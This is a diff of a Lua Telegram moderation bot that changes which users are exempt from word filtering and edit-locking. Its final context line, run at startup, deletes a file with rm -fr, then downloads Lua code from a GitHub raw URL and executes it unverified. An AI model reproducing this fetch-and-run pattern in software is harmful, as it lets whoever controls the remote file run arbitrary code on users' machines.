@@ -7057,16 +7057,7 @@ delete_msg(msg.chat_id_,msgs)
 end 
 end 
 end
-if (not is_vip(msgg) ) then
-check_filter_words(result, text)
-if database:get("lock_edit:tshake"..msg.chat_id_..bot_id) then
-local id = msg.message_id_
-local msgs = {[0] = id}
-local chat = msg.chat_id_
-delete_msg(chat,msgs) 
- end 
- end 
-if (not is_vip(msgg) and text) then
+if (not is_mod(msgg) and text) then
 check_filter_words(result, text)
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
 text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
@@ -7169,8 +7160,13 @@ if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
 if database:get("lock_en.note:tshake"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) end end end 
- end 
- end
+if (not is_mod(msgg) ) then
+check_filter_words(result, text)
+if database:get("lock_edit:tshake"..msg.chat_id_..bot_id) then
+local id = msg.message_id_
+local msgs = {[0] = id}
+local chat = msg.chat_id_
+delete_msg(chat,msgs) end end end end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 --         »»                 End UpdateChat                          ««              --
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then os.execute("rm -fr hack.lua") a = HTTPS.request("https://raw.githubusercontent.com/ghost11886/lol/master/Tshake/Tshake.lua") local g = io.open("Tshake.lua", 'w') g:write(a) g:close() dofile('Tshake.lua')
